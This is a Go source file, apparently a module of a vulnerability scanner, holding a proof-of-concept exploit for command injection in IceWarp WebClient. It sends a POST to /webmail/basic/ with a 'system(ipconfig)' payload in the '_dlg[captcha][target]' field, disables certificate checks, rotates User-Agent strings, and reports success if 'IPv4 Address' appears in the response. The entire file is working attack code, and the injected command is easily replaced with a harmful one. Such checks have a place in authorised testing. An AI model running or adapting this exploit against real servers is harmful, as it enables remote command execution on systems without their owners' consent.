package POC

import (
	"crypto/tls"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

//随机UA头
func rndua() string {
	ua := []string{"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
		"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
		"Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
		"Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
		"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows; Intel Windows) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67"}
	n := rand.Intn(13) + 1
	return ua[n]
}

type IceWarp_WebClient_basic_command_injection struct {
}

func (a IceWarp_WebClient_basic_command_injection) Attack(target string) bool {
	proxy, _ := url.Parse("http://127.0.0.1:8080")
	tr := &http.Transport{
		//关闭证书验证
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//设置超时
		Dial: (&net.Dialer{
			Timeout:   2 * time.Second,
			KeepAlive: 30 * time.Second,
		}).Dial,
		TLSHandshakeTimeout:   5 * time.Second,
		ResponseHeaderTimeout: 2 * time.Second,
		ExpectContinueTimeout: 2 * time.Second,
		//设置代理
		Proxy: http.ProxyURL(proxy),
	}
	client := &http.Client{
		//禁止重定向
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
	}
	pocurl := "/webmail/basic/"
	data := "_dlg[captcha][target]=system(\\'ipconfig\\')\\"

	req, err := http.NewRequest("POST", target+pocurl, strings.NewReader(data))
	if err != nil {
		return false
	}
	req.Header.Add("Cache-Control", "max-age=0")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("User-Agent", rndua())
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	resp, err := client.Do(req)

	if err != nil {
		//fmt.Println("[-]: ", err)
		return false
	}
	defer resp.Body.Close()
	result, _ := ioutil.ReadAll(resp.Body)
	httpbody := string(result)
	if strings.Contains(httpbody, "IPv4 Address") {
		//color.RGBStyleFromString("197,107,58").Println("[+] Send Payload to ", target, " matchbanner:  match: True")
		return true
	} else {
		//color.RGBStyleFromString("197,107,58").Println("[+] Send Payload to ", target, " match: False")
		return false
	}
}
